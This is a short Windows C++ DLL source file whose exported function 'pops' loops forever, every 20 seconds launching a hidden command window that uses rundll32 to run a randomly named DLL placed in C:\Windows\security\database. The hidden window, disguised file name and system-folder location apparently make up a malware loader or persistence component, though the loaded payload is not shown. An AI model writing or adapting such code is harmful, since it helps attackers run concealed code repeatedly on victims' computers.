// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <shellapi.h>
#include "dllmain.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void pops() {
    while (true) {
        ShellExecute(
            NULL,
            TEXT("open"),
            TEXT("cmd"),
            L"/c rundll32 C:\\Windows\\security\\database\\cLHmKpngPKJeIIDxXeFq.dll, pop",
            NULL,
            SW_HIDE
        );
        Sleep(20000);
    }
}